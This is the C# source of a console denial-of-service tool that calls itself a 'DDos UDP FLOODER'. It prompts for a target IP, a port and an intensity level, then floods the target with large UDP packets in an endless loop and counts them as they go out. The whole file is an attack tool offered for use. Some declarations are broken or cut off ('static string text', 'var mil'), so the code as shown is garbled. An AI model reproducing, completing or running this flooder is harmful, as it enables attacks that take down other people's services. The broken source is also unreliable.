using System;
using System.Net;
using System.Text;
using System.Net.Sockets;

namespace ddos
{
    class Program
    {
        static string text
        static IPAddress ipAddr = IPAddress.None;
        
        static int port = 80;
       
        static void Main(string[] args)
        {
            Console.WriteLine("");
            Console.WriteLine(" DDos UDP FLOODER PACKETS by: Dione4G");
            Console.WriteLine("");
            try
            {
                Console.Write("   > Insert IP: ");
                ipAddr = IPAddress.Parse(Console.ReadLine());
                Console.Write("   > Insert Port: ");
                port = int.Parse(Console.ReadLine());
                Console.Write("   > Amount from 3 to 7: ");
                int potencia = int.Parse(Console.ReadLine());
                var cantidads = "0";
                if (potencia == 3)
                {
                    cantidads = "30.000 Characters";
                    text = text + text + text;
                }
                else if (potencia == 4)
                {
                    cantidads = "40.000 Characters";
                    text = text + text + text + text;
                }
                else if (potencia == 5)
                {
                    cantidads = "50.000 Characters";
                    text = text + text + text + text + text;
                }
                else if (potencia == 6)
                {
                    cantidads = "60.000 Characters";
                    text = text + text + text + text + text + text;
                }
                else if (potencia == 7)
                {
                    cantidads = "65.513 Characters";
                    var mil
                    var cien = "holasholasholasholasholasholasholasholasholasholasholasholasholasholasholasholasholasholasholasholas";
                    text = text + text + text + text + text + text + mil + mil + mil + mil + mil + cien + cien + cien + cien + cien + "holasholasHOL";
                }
                
                
                int counter = 0;
                while (SendDate())
                {
                    counter++;
                    Console.Write("   {0} packages sent | " + cantidads, counter);
                    Console.CursorLeft = 0;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("   error: " + e.Message);
                System.Threading.Thread.Sleep(4500);
            }

        }
        static bool SendDate()
        {
            try
            {
                new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(Encoding.ASCII.GetBytes(text), new IPEndPoint(ipAddr, port));
                return true;
            
            }
            catch (Exception)
            {
                return false;
            }
        }

    }
}



